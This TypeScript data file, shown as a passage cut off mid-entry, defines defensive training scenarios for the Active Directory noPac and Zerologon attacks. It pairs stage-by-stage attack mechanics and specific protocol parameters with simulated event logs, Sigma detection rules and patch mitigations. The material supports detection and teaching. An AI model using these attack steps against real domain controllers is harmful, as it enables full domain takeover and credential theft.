import { AttackScenario } from './types';

/**
 * ============================================================================
 * AUTHORITATIVE APT & ZERO-DAY SCENARIOS — BATCH 2 (AD, EXCHANGE, SPOOLER & SHAREPOINT)
 * ============================================================================
 * Multi-Source Verified Scenarios:
 * 6. Active Directory noPac (CVE-2021-42278 & CVE-2021-42287) — Microsoft MSRC, CrowdStrike, Splunk SURGe
 * 7. Active Directory Zerologon (CVE-2020-1472) — Secura, CISA ED 20-04, CrowdStrike, Microsoft
 * 8. Microsoft Exchange ProxyShell (CVE-2021-34473 / 34523 / 31207) — DEVCORE (Orange Tsai), CISA AA21-265A, Mandiant
 * 9. Windows Print Spooler PrintNightmare (CVE-2021-34527) — Microsoft MSRC, Rapid7, CISA, Elastic Security Labs
 * 10. SharePoint Pre-Auth JWT to BCS RCE (CVE-2023-29357 & CVE-2023-24955) — STAR Labs, Microsoft MSRC, Rapid7, CISA
 */

export const NOPAC_SAMACCOUNTNAME_CVE_2021_42278_42287_SCENARIO: AttackScenario = {
  id: 'nopac-samaccountname-cve-2021-42278-42287',
  code: 'CVE-2021-42287',
  name: 'Microsoft, CrowdStrike & Splunk — Active Directory "noPac": sAMAccountName Spoofing & KDC Impersonation',
  shortSubtitle: 'Microsoft MSRC · CrowdStrike · Splunk SURGe · CVE-2021-42278 + CVE-2021-42287 S4U2self Domain Admin',
  category: 'ACTIVE_DIRECTORY',
  severity: 'CRITICAL',
  primaryMitrePhase: 5,
  overview:
    'Documented by Microsoft MSRC, CrowdStrike, Splunk SURGe, and CISA (November–December 2021), "noPac" chains CVE-2021-42278 (Active Directory sAMAccountName spoofing) with CVE-2021-42287 (Kerberos KDC service ticket lookup fallback) to escalate any standard domain user to Domain Admin in seconds. Using the default ms-DS-MachineAccountQuota (10), the attacker creates a new computer account, renames its sAMAccountName to match a Domain Controller ("CORP-DC01" without the trailing "$"), requests a Kerberos TGT (EventID 4768), renames the computer account back, and issues an S4U2self TGS request (EventID 4769). Because "CORP-DC01" no longer exists, the KDC automatically appends "$" and encrypts a Domain Admin service ticket for the real "CORP-DC01$" Domain Controller.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'Microsoft MSRC · CrowdStrike Falcon Threat Intel · Splunk SURGe · CISA KEV',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1068 (Privilege Escalation) · T1558.001 (Golden/Silver Ticket S4U2self) · T1003.006 (DCSync)',
    },
    {
      term: 'CHAINED CVES',
      value: 'CVE-2021-42278 (sAMAccountName "$" Bypass) + CVE-2021-42287 (KDC "$" Fallback)',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: 'WinSec EID 4741 (Machine Create) -> EID 4781 (Rename to DC) -> EID 4768/4769 (S4U2self)',
    },
  ],
  nodes: [
    {
      id: 'nopac_domain_user',
      label: 'Compromised Domain User',
      sublabel: '10.10.20.44 (CORP\\lowpriv_user)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'Domain-Joined Workstation (noPac / sam-the-admin)',
        pidOrPort: 'LDAP :389 & Kerberos :88',
        privilege: 'Standard Domain User (ms-DS-MachineAccountQuota = 10)',
        artifacts: [
          'noPac.exe / sam_the_admin.py',
          'LDAP AddRequest (CN=FAKEPC01) & ModifyRequest (sAMAccountName=CORP-DC01)',
        ],
        description:
          'Standard domain user abusing default ms-DS-MachineAccountQuota (>0) to create a machine account and spoof the Domain Controller’s sAMAccountName.',
      },
    },
    {
      id: 'corp_dc01_kdc',
      label: 'Domain Controller (CORP-DC01)',
      sublabel: '10.10.0.5 (AD DS & Kerberos KDC)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Windows Server 2019 Domain Controller (kdcsvc.dll)',
        pidOrPort: 'PID 688 (lsass.exe — Kerberos KDC & LDAP)',
        privilege: 'NT AUTHORITY\\SYSTEM (Tier-0 Domain Controller)',
        artifacts: [
          'Computer Object: CORP-DC01$ (Real DC) vs CORP-DC01 (Spoofed)',
          'WinSec EventID 4741, 4781, 4768, 4769',
        ],
        description:
          'Active Directory Domain Controller whose LDAP server allows sAMAccountName without trailing "$" (CVE-2021-42278) and whose KDC falls back to appending "$" (CVE-2021-42287).',
      },
    },
    {
      id: 'kdc_s4u2self_engine',
      label: 'KDC S4U2self Ticket Engine',
      sublabel: 'kdcsvc.dll (Pacless TGT -> DC$ TGS)',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'Kerberos Key Distribution Center Service (lsass.exe)',
        pidOrPort: 'TCP/UDP :88 (KRB_TGS_REQ S4U2self)',
        privilege: 'Domain KDC Signing Authority',
        artifacts: [
          'KRB_AS_REQ for sAMAccountName="CORP-DC01"',
          'KRB_TGS_REQ (PA-FOR-USER: Administrator@CORP.LOCAL) -> Lookup "CORP-DC01$"',
        ],
        description:
          'When looking up the requesting account "CORP-DC01" during S4U2self processing, KDC fails to find "CORP-DC01", appends "$", and issues a TGS for "CORP-DC01$" with Domain Admin PAC.',
      },
    },
    {
      id: 'ntds_dcsync_vault',
      label: 'NTDS.dit & DCSync Replication',
      sublabel: 'cifs/CORP-DC01.corp.local Ticket',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'Active Directory Replication Service (MS-DRSR)',
        pidOrPort: 'RPC :135 / Dynamic TCP (DrsGetNCChanges)',
        privilege: 'Domain Administrator / DC Replication',
        artifacts: [
          'Forged S4U2self Service Ticket for cifs/CORP-DC01.corp.local',
          'Extracted krbtgt & Domain Admin NTLM Hashes',
        ],
        description:
          'Using the high-privilege S4U2self ticket issued for CORP-DC01$, the attacker performs DCSync or SMB execution on the Domain Controller.',
      },
    },
    {
      id: 'ad_splunk_siem',
      label: 'Splunk SIEM & Identity Sensor',
      sublabel: 'WinSec EID 4741 / 4781 / 4768 / 4769',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'SOC SIEM & Active Directory Identity Protection',
        pidOrPort: 'Windows Security Event Log Correlator',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'EventID 4781: Computer account renamed to match DC hostname without "$"',
          'EventID 4769: S4U2self ticket where cname lacks "$" and sname is DC',
        ],
        description:
          'Correlates machine account creation (4741), sAMAccountName rename stripping "$" (4781), and anomalous KDC ticket requests (4768/4769).',
      },
    },
  ],
  processTree: [
    {
      pid: 688,
      ppid: 520,
      name: 'lsass.exe (LDAP + KDC)',
      commandLine: 'C:\\Windows\\System32\\lsass.exe',
      user: 'NT AUTHORITY\\SYSTEM',
      integrity: 'SYSTEM',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: ['LdapModifysAMAccountName("CORP-DC01")', 'KdcGetTicket(KRB_AS_REQ)'],
    },
    {
      pid: 688,
      ppid: 520,
      name: 'kdcsvc.dll (S4U2self Lookup)',
      commandLine: 'lsass.exe!KdcVerifyPacAndLookupClient("CORP-DC01" -> fallback "CORP-DC01$")',
      user: 'NT AUTHORITY\\SYSTEM',
      integrity: 'SYSTEM',
      status: 'injected',
      activeFromStage: 2,
      apiCalls: [
        'SamIGetUserLogonInformation("CORP-DC01") -> STATUS_NO_SUCH_USER',
        'SamIGetUserLogonInformation("CORP-DC01$") -> SUCCESS (Real DC)',
      ],
      memoryBlocks: [
        {
          address: '0x00007FF92A180000',
          section: 'kdcsvc.dll (KDC S4U2self Ticket Context)',
          permissions: 'RW-',
          size: '32 KB',
          status: 'injected',
          description:
            'KDC S4U2self fallback resolving the deleted/renamed client name "CORP-DC01" to the real Domain Controller account "CORP-DC01$".',
          hexPreview: 'Client="CORP-DC01" -> Lookup("CORP-DC01$") -> Impersonate="Administrator"',
        },
      ],
    },
    {
      pid: 4412,
      ppid: 688,
      name: 'secretsdump / noPac DCSync',
      commandLine: 'DrsGetNCChanges(CORP-DC01.corp.local, "krbtgt")',
      user: 'CORP\\Administrator (Impersonated)',
      integrity: 'SYSTEM',
      status: 'malicious',
      activeFromStage: 3,
      apiCalls: ['IDL_DRSGetNCChanges()', 'SamrQueryInformationUser()'],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'MACHINE ACCOUNT CREATION & SAMACCOUNTNAME SPOOFING (CVE-2021-42278)',
      subtitle: 'Creating a machine account and renaming sAMAccountName to "CORP-DC01" (without "$")',
      description:
        'Abusing the default Active Directory setting ms-DS-MachineAccountQuota = 10, a standard domain user creates a new machine account (e.g., "FAKEPC01$") over LDAP. Exploiting CVE-2021-42278 (which failed to enforce that computer sAMAccountNames must end with "$"), the attacker modifies the new computer’s sAMAccountName to "CORP-DC01"—matching the exact hostname of the Domain Controller without its trailing "$"—and requests a Kerberos TGT (KRB_AS_REQ).',
      mitreTacticPhase: 5,
      mitreTechniqueId: 'T1068',
      mitreTechniqueName: 'Exploitation for Privilege Escalation',
      activeNodeIds: ['nopac_domain_user', 'corp_dc01_kdc', 'ad_splunk_siem'],
      compromisedNodeIds: ['corp_dc01_kdc'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2021-42278 (AD sAMAccountName Validation Bypass)' },
        { term: 'DEFAULT QUOTA', value: 'ms-DS-MachineAccountQuota = 10 (Standard Domain User)' },
        { term: 'SPOOFED NAME', value: 'sAMAccountName = "CORP-DC01" (Stripped trailing "$")' },
      ],
    },
    {
      index: 2,
      title: 'RENAME BACK & KDC S4U2SELF "$" FALLBACK (CVE-2021-42287)',
      subtitle: 'KDC fails to find "CORP-DC01", appends "$", and issues a TGS for the real Domain Controller',
      description:
        'Immediately after receiving the TGT for "CORP-DC01", the attacker renames their machine account back to "FAKEPC01$" over LDAP and submits a Kerberos S4U2self TGS request (KRB_TGS_REQ) presenting the "CORP-DC01" TGT while asking to impersonate "Administrator" to the Domain Controller. Because "CORP-DC01" no longer exists in AD, the KDC triggers CVE-2021-42287: it automatically appends a trailing "$" ("CORP-DC01$"), finds the real Domain Controller account, and issues a Domain Admin service ticket encrypted with the real DC’s secret key!',
      mitreTacticPhase: 5,
      mitreTechniqueId: 'T1558.001',
      mitreTechniqueName: 'Steal or Forge Kerberos Tickets: Golden/Silver Ticket',
      activeNodeIds: ['nopac_domain_user', 'corp_dc01_kdc', 'kdc_s4u2self_engine', 'ad_splunk_siem'],
      compromisedNodeIds: ['corp_dc01_kdc', 'kdc_s4u2self_engine'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2021-42287 (KDC Account Lookup "$" Fallback)' },
        { term: 'KERBEROS EXTENSION', value: 'S4U2self (PA-FOR-USER = Administrator@CORP.LOCAL)' },
        { term: 'ISSUED TICKET', value: 'cifs/CORP-DC01.corp.local with Domain Admin PAC' },
      ],
    },
    {
      index: 3,
      title: 'DOMAIN CONTROLLER IMPERSONATION & NTDS.DIT DCSYNC',
      subtitle: 'Presenting the forged cifs/HOST ticket to CORP-DC01 to dump krbtgt and Domain Admin hashes',
      description:
        'Armed with a valid Kerberos service ticket for CORP-DC01.corp.local containing a privileged Privilege Attribute Certificate (PAC) for Domain Administrator, the attacker authenticates directly to the Domain Controller and invokes MS-DRSR directory replication (DCSync) or SMB service execution to dump all domain password hashes from NTDS.dit.',
      mitreTacticPhase: 5,
      mitreTechniqueId: 'T1003.006',
      mitreTechniqueName: 'OS Credential Dumping: DCSync',
      activeNodeIds: ['nopac_domain_user', 'kdc_s4u2self_engine', 'ntds_dcsync_vault', 'ad_splunk_siem'],
      compromisedNodeIds: ['corp_dc01_kdc', 'kdc_s4u2self_engine', 'ntds_dcsync_vault'],
      keySpecs: [
        { term: 'AUTHENTICATION', value: 'Kerberos AP-REQ with Domain Admin S4U2self Ticket' },
        { term: 'POST-EXPLOIT', value: 'MS-DRSR DrsGetNCChanges (DCSync) on CORP-DC01' },
        { term: 'COMPROMISED ASSET', value: 'krbtgt AES256/NTLM keys & Full Domain Compromise' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'nopac-1',
      no: 1,
      stageIndex: 1,
      timestamp: '10:22:14.088',
      sourceNodeId: 'nopac_domain_user',
      targetNodeId: 'corp_dc01_kdc',
      sourceLabel: '10.10.20.44 (lowpriv_user)',
      targetLabel: 'CORP-DC01 :389 / :88',
      sourceType: 'WIN_EVENT',
      protocolOrEventId: 'WinSec EID 4741 & 4781',
      shortAction: 'SPOOF DC SAMACCOUNTNAME',
      info: 'EventID 4741 (Create FAKEPC01$) -> EventID 4781 (Rename sAMAccountName from FAKEPC01$ to CORP-DC01)',
      sizeOrCode: 'EID 4781',
      severity: 'CRITICAL',
      mitreId: 'T1068',
      explanation:
        'Splunk SURGe and CrowdStrike highlight Windows Security EventID 4781 where a computer account’s sAMAccountName is renamed to match an existing Domain Controller name without the trailing "$".',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System><EventID>4781</EventID></System>
  <EventData>
    <Data Name="SubjectUserName">lowpriv_user</Data>
    <Data Name="OldTargetUserName">FAKEPC01$</Data>
    <Data Name="NewTargetUserName">CORP-DC01</Data>
    <Data Name="TargetSid">S-1-5-21-384192811-941028412-119204812-4192</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Active Directory noPac sAMAccountName Spoofing (CVE-2021-42278)',
        ruleCode: `title: Active Directory Computer sAMAccountName Renamed Without Dollar Sign (noPac)
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4781
    OldTargetUserName|endswith: '$'
  filter:
    NewTargetUserName|endswith: '$'
  condition: selection and not filter
level: critical`,
        mitigation:
          'Install KB5008380 / KB5008602 on all Domain Controllers and set ms-DS-MachineAccountQuota = 0 via Group Policy / ADSI Edit.',
      },
    },
    {
      id: 'nopac-2',
      no: 2,
      stageIndex: 2,
      timestamp: '10:22:14.412',
      sourceNodeId: 'corp_dc01_kdc',
      targetNodeId: 'kdc_s4u2self_engine',
      sourceLabel: 'CORP-DC01 KDC',
      targetLabel: 'kdcsvc.dll (S4U2self)',
      sourceType: 'WIN_EVENT',
      protocolOrEventId: 'WinSec EID 4768 & 4769',
      shortAction: 'KDC "$" FALLBACK TGS',
      info: 'EventID 4769 S4U2self ticket issued after "CORP-DC01" renamed back to "FAKEPC01$" (CVE-2021-42287)',
      sizeOrCode: 'EID 4769',
      severity: 'CRITICAL',
      mitreId: 'T1558.001',
      explanation:
        'Because "CORP-DC01" was renamed back before the TGS-REQ, KDC falls back to "CORP-DC01$" and issues a high-privilege ticket for the Domain Controller.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System><EventID>4769</EventID></System>
  <EventData>
    <Data Name="TargetUserName">Administrator@CORP.LOCAL</Data>
    <Data Name="ServiceName">cifs/CORP-DC01.corp.local</Data>
    <Data Name="IpAddress">::ffff:10.10.20.44</Data>
    <Data Name="TicketOptions">0x40810000</Data>
    <Data Name="Status">0x0</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'KDC S4U2self Ticket Impersonation Following Account Rename (CVE-2021-42287)',
        ruleCode: `title: Kerberos CVE-2021-42287 KDC Domain Controller Impersonation
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID:
      - 4768
      - 4769
      - 4781
  condition: selection
level: high`,
        mitigation:
          'Enable PacRequestorEnforcement = 2 across all Domain Controllers after installing Microsoft’s November 2021 KDC updates.',
      },
    },
    {
      id: 'nopac-3',
      no: 3,
      stageIndex: 3,
      timestamp: '10:22:16.905',
      sourceNodeId: 'kdc_s4u2self_engine',
      targetNodeId: 'ntds_dcsync_vault',
      sourceLabel: '10.10.20.44 (Forged TGS)',
      targetLabel: 'CORP-DC01 NTDS.dit',
      sourceType: 'WIN_EVENT',
      protocolOrEventId: 'WinSec EID 4662 (DCSync)',
      shortAction: 'DCSYNC REPLICATION',
      info: 'EventID 4662 DS-Replication-Get-Changes-All using forged S4U2self Administrator ticket',
      sizeOrCode: 'EID 4662',
      severity: 'CRITICAL',
      mitreId: 'T1003.006',
      explanation:
        'Using the forged S4U2self ticket for CORP-DC01, the attacker runs secretsdump.py to replicate NTDS.dit hashes via MS-DRSR.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System><EventID>4662</EventID></System>
  <EventData>
    <Data Name="SubjectUserName">Administrator</Data>
    <Data Name="ObjectType">%{19195a5b-6da0-11d0-afd3-00c04fd930c9}</Data>
    <Data Name="Properties">%{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}</Data>
    <Data Name="AccessMask">0x100</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Active Directory DCSync Replication From Non-DC Workstation (EID 4662)',
        ruleCode: `title: Active Directory DCSync Attack (EventID 4662)
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4662
    Properties|contains: '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
  condition: selection
level: critical`,
        mitigation:
          'Delete any unauthorized computer accounts created via ms-DS-MachineAccountQuota and twice-reset the krbtgt password.',
      },
    },
  ],
};

export const ZEROLOGON_NETLOGON_CVE_2020_1472_SCENARIO: AttackScenario = {
  id: 'zerologon-netlogon-cve-2020-1472',
  code: 'CVE-2020-1472',
  name: 'Secura, CISA & CrowdStrike — Active Directory "Zerologon": Netlogon AES-CFB8 All-Zero IV Takeover',
  shortSubtitle: 'Secura · CISA ED 20-04 · CrowdStrike · MS-NRPC NetrServerAuthenticate3 & NetrServerPasswordSet2',
  category: 'ACTIVE_DIRECTORY',
  severity: 'CRITICAL',
  primaryMitrePhase: 5,
  overview:
    'Discovered by Tom Tervoort of Secura and mandated for emergency remediation under CISA Emergency Directive 20-04 (August–September 2020), "Zerologon" (CVE-2020-1472, CVSS 10.0) is a cryptographic flaw in Microsoft’s Netlogon Remote Protocol (MS-NRPC). Because ComputeNetlogonCredential() encrypted the 8-byte client challenge using AES-CFB8 with a hardcoded all-zero 16-byte Initialization Vector (IV), sending an 8-byte client challenge of all zeroes (0x0000000000000000) produces an all-zero ciphertext with a 1-in-256 probability for any session key. In ~256 unauthenticated RPC calls (~3 seconds), an attacker bypasses NetrServerAuthenticate3, calls NetrServerPasswordSet2 to overwrite the Domain Controller’s computer password (CORP-DC01$) with an empty string (EventID 4742), and performs DCSync.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'Secura Zerologon Whitepaper · CISA Emergency Directive 20-04 · CrowdStrike & Microsoft MSRC',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1210 (Exploitation of Remote Services) · T1098 (Account Manipulation: DC$) · T1003.006 (DCSync)',
    },
    {
      term: 'CRYPTOGRAPHIC FLAW',
      value: 'MS-NRPC ComputeNetlogonCredential() AES-CFB8 with All-Zero 16-Byte IV (1/256 Forgery)',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: 'RPC NetrServerAuthenticate3 Brute-Force -> WinSec EID 4742 (Anonymous Logon modifying DC$)',
    },
  ],
  nodes: [
    {
      id: 'zerologon_attacker',
      label: 'Internal Network Attacker',
      sublabel: '10.10.20.88 (Unauthenticated RPC Client)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'Unauthenticated LAN Host (zerologon_tester / mimikatz)',
        pidOrPort: 'RPC over TCP :135 / Dynamic Endpoint (MS-NRPC)',
        privilege: 'Unauthenticated Network Access (Zero Domain Credentials)',
        artifacts: [
          'NetrServerReqChallenge(ClientChallenge = 0x0000000000000000)',
          'NetrServerAuthenticate3(ClientCredential = 0x0000000000000000, Flags = 0x212fffff)',
        ],
        description:
          'Attacker sending ~256 unauthenticated MS-NRPC handshake attempts with an 8-byte all-zero ClientChallenge until AES-CFB8 outputs 8 zero bytes.',
      },
    },
    {
      id: 'dc01_netlogon_host',
      label: 'Domain Controller (CORP-DC01)',
      sublabel: '10.10.0.5 (Netlogon Service lsass.exe)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Windows Server 2019 Domain Controller (netlogon.dll)',
        pidOrPort: 'PID 688 (lsass.exe — MS-NRPC Server)',
        privilege: 'NT AUTHORITY\\SYSTEM',
        artifacts: [
          'C:\\Windows\\System32\\netlogon.dll',
          'System EventID 5805 & Security EventID 4742',
        ],
        description:
          'Domain Controller whose Netlogon RPC interface accepts unsealed connections when NegotiateFlags bit 0x00400000 (Seal) is cleared.',
      },
    },
    {
      id: 'aes_cfb8_zero_iv',
      label: 'Netlogon AES-CFB8 & Password Reset',
      sublabel: 'ComputeNetlogonCredential -> NetrServerPasswordSet2',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'In-Memory Netlogon Session State (netlogon.dll)',
        pidOrPort: 'PID 688 (lsass.exe)',
        privilege: 'Domain Controller Machine Account (CORP-DC01$)',
        artifacts: [
          'AES-CFB8(Key=SessionKey, IV=0x00*16, Plaintext=0x00*8) == 0x00*8',
          'NetrServerPasswordSet2(ClearNewPassword = 0x00 * 516)',
        ],
        description:
          'Once the 1-in-256 zero credential matches, NetrServerPasswordSet2 overwrites CORP-DC01$’s machine password in Active Directory NTDS.dit with an empty password (NTLM hash 31d6cfe0d16ae931b73c59d7e0c089c0).',
      },
    },
    {
      id: 'dcsync_ntds_dump',
      label: 'CORP-DC01$ DCSync Replication',
      sublabel: 'Empty NTLM Hash -> DrsGetNCChanges',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'Active Directory NTDS.dit Database',
        pidOrPort: 'MS-DRSR Replication as CORP\\CORP-DC01$',
        privilege: 'Domain Controller Replication Privilege',
        artifacts: [
          'CORP-DC01$ NTLM = 31d6cfe0d16ae931b73c59d7e0c089c0 (Empty String)',
          'Full Domain Hash Dump & Silver/Golden Ticket Minting',
        ],
        description:
          'Because a Domain Controller’s machine account (CORP-DC01$) inherently possesses MS-DRSR replication rights, authenticating with its new empty password dumps the entire domain.',
      },
    },
    {
      id: 'dc_edr_siem',
      label: 'CrowdStrike / SIEM Sensor',
      sublabel: 'WinSec EID 4742 + Zeek DCERPC',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'SOC SIEM & Network NDR Sensor',
        pidOrPort: 'WinSec EID 4742 (ANONYMOUS LOGON) & Sys EID 5805',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'EventID 4742: SubjectUserName="ANONYMOUS LOGON" modifying CORP-DC01$',
          'Zeek DCERPC flood of NetrServerReqChallenge / NetrServerAuthenticate3',
        ],
        description:
          'Detects the ~256 failed Netlogon authentication events (System EID 5805) followed immediately by ANONYMOUS LOGON changing the DC computer password (Security EID 4742).',
      },
    },
  ],
  processTree: [
    {
      pid: 688,
      ppid: 520,
      name: 'lsass.exe (netlogon.dll)',
      commandLine: 'C:\\Windows\\System32\\lsass.exe (MS-NRPC UUID 12345678-1234-abcd-ef00-01234567cffb)',
      user: 'NT AUTHORITY\\SYSTEM',
      integrity: 'SYSTEM',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: ['NetrServerReqChallenge()', 'ComputeNetlogonCredential(AES_CFB8, IV=0)', 'NetrServerAuthenticate3()'],
    },
    {
      pid: 688,
      ppid: 520,
      name: 'netlogon.dll!NetrServerPasswordSet2',
      commandLine: 'NetrServerPasswordSet2(PrimaryName="\\\\CORP-DC01", AccountName="CORP-DC01$", ClearNewPassword=0x00*516)',
      user: 'NT AUTHORITY\\ANONYMOUS LOGON',
      integrity: 'SYSTEM',
      status: 'injected',
      activeFromStage: 2,
      apiCalls: ['NetrServerPasswordSet2()', 'SamrSetInformationUser(Password="")'],
      memoryBlocks: [
        {
          address: '0x00007FF92C041000',
          section: 'netlogon.dll (AES-CFB8 All-Zero IV Context)',
          permissions: 'RW-',
          size: '16 KB',
          status: 'injected',
          description:
            'ComputeNetlogonCredential initializing a 16-byte stack IV to all zeroes (memset(IV, 0, 16)) before AES-CFB8 encryption.',
          hexPreview: 'IV = 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | Challenge = 00*8 -> Cred = 00*8',
        },
      ],
    },
    {
      pid: 688,
      ppid: 520,
      name: 'ntdsa.dll (DCSync via CORP-DC01$)',
      commandLine: 'IDL_DRSGetNCChanges(Client="CORP\\CORP-DC01$", NTLM=31d6cfe0d16ae931b73c59d7e0c089c0)',
      user: 'CORP\\CORP-DC01$',
      integrity: 'SYSTEM',
      status: 'malicious',
      activeFromStage: 3,
      apiCalls: ['IDL_DRSGetNCChanges()', 'NetrServerPasswordSet2(RestoreRegistryMachinePass)'],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'ALL-ZERO AES-CFB8 CHALLENGE SPOOFING (CVE-2020-1472)',
      subtitle: 'Sending 8 zero bytes to NetrServerAuthenticate3 until AES-CFB8 with a zero IV outputs 8 zero bytes',
      description:
        'As discovered by Secura, Netlogon’s ComputeNetlogonCredential() function encrypts an 8-byte challenge using 8-bit Cipher Feedback mode (AES-CFB8) with a fixed, all-zero 16-byte Initialization Vector (IV). Because AES-CFB8 XORs each plaintext byte with the first byte of AES(IV || Ciphertext), for 1 out of every 256 random session keys, encrypting 8 zero bytes produces 8 zero bytes! By looping NetrServerReqChallenge and NetrServerAuthenticate3 with ClientChallenge = 0x00*8 and ClientCredential = 0x00*8 (~256 tries in 3 seconds), the attacker establishes an authenticated Netlogon session as CORP-DC01$.',
      mitreTacticPhase: 6,
      mitreTechniqueId: 'T1210',
      mitreTechniqueName: 'Exploitation of Remote Services',
      activeNodeIds: ['zerologon_attacker', 'dc01_netlogon_host', 'dc_edr_siem'],
      compromisedNodeIds: ['dc01_netlogon_host'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2020-1472 ("Zerologon" — CVSS 10.0 MS-NRPC)' },
        { term: 'CRYPTO FLAW', value: 'AES-CFB8 with All-Zero IV (1-in-256 Zero Fixed Point)' },
        { term: 'RPC CALLS', value: 'NetrServerReqChallenge + NetrServerAuthenticate3 (Flags 0x212fffff)' },
      ],
    },
    {
      index: 2,
      title: 'OVERWRITING THE DOMAIN CONTROLLER PASSWORD VIA NETRSERVERPASSWORDSET2',
      subtitle: 'Setting CORP-DC01$’s Active Directory password to an empty string (EventID 4742)',
      description:
        'After clearing the Netlogon Signing and Sealing flag (0x00400000) so RPC messages do not need to be encrypted with the unknown session key, the attacker invokes NetrServerPasswordSet2 over the spoofed secure channel, supplying a 516-byte buffer of all zeroes as the new password. Active Directory updates the CORP-DC01$ machine account password in NTDS.dit to an empty string (NTLM hash 31d6cfe0d16ae931b73c59d7e0c089c0), logging Windows Security EventID 4742 by ANONYMOUS LOGON.',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1098',
      mitreTechniqueName: 'Account Manipulation',
      activeNodeIds: ['zerologon_attacker', 'dc01_netlogon_host', 'aes_cfb8_zero_iv', 'dc_edr_siem'],
      compromisedNodeIds: ['dc01_netlogon_host', 'aes_cfb8_zero_iv'],
      keySpecs: [
        { term: 'RPC FUNCTION', value: 'NetrServerPasswordSet2 (ClearNewPassword = 516 Zero Bytes)' },
        { term: 'NEW DC$ NTLM HASH', value: '31d6cfe0d16ae931b73c59d7e0c089c0 (Empty Password)' },
        { term: 'WINDOWS EVENT', value: 'Security EventID 4742 (SubjectUserName: ANONYMOUS LOGON)' },
      ],
    },
    {
      index: 3,
      title: 'DCSYNC DOMAIN DUMP & REGISTRY MACHINE PASSWORD RESTORATION',
      subtitle: 'Authenticating as CORP-DC01$ with an empty password to run DCSync and restore $MACHINE.ACC',
      description:
        'Because a Domain Controller computer account (CORP-DC01$) is a member of the Enterprise Domain Controllers group with full replication rights, the attacker connects over SMB/RPC as CORP\\CORP-DC01$ with an empty password and runs DCSync (DrsGetNCChanges) to dump the Domain Administrator and krbtgt hashes. Finally, using those Domain Admin credentials, the attacker reads the original machine password stored in the DC’s local registry (HKLM\\SECURITY\\Policy\\Secrets\\$MACHINE.ACC) and restores it so Active Directory replication does not break.',
      mitreTacticPhase: 5,
      mitreTechniqueId: 'T1003.006',
      mitreTechniqueName: 'OS Credential Dumping: DCSync',
      activeNodeIds: ['zerologon_attacker', 'aes_cfb8_zero_iv', 'dcsync_ntds_dump', 'dc_edr_siem'],
      compromisedNodeIds: ['dc01_netlogon_host', 'aes_cfb8_zero_iv', 'dcsync_ntds_dump'],
      keySpecs: [
        { term: 'REPLICATION IDENTITY', value: 'CORP\\CORP-DC01$ (Enterprise Domain Controllers)' },
        { term: 'CLEANUP ARTIFACT', value: 'Restores HKLM\\SECURITY\\Policy\\Secrets\\$MACHINE.ACC' },
        { term: 'MANDATED PATCH', value: 'CISA Emergency Directive 20-04 / Secure RPC Enforcement' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'zl-1472-1',
      no: 1,
      stageIndex: 1,
      timestamp: '01:14:02.110',
      sourceNodeId: 'zerologon_attacker',
      targetNodeId: 'dc01_netlogon_host',
      sourceLabel: '10.10.20.88',
      targetLabel: 'CORP-DC01 (MS-NRPC)',
      sourceType: 'WIN_EVENT',
      protocolOrEventId: 'System EID 5805 + Zeek RPC',
      shortAction: 'NRPC ZERO-IV BRUTE',
      info: '~256 rapid NetrServerAuthenticate3 calls with ClientChallenge=0x00*8 triggering System EventID 5805',
      sizeOrCode: '214 RPC Tries',
      severity: 'HIGH',
      mitreId: 'T1210',
      explanation:
        'Each unsuccessful 1-in-256 attempt to guess the all-zero AES-CFB8 output logs System EventID 5805 (Netlogon authentication failed for machine CORP-DC01$).',
      rawLog: `[ZEEK_DCERPC] id.orig_h=10.10.20.88 id.resp_h=10.10.0.5 named_pipe="netlogon" endpoint="nrpc" operation="NetrServerAuthenticate3"
[System EventLog] EventID=5805 Source="NETLOGON" Computer="CORP-DC01.corp.local"
Message="The session setup from the computer CORP-DC01 failed to authenticate. The name(s) of the account(s) referenced in the security database is CORP-DC01$."`,
      detectionRule: {
        type: 'SURICATA',
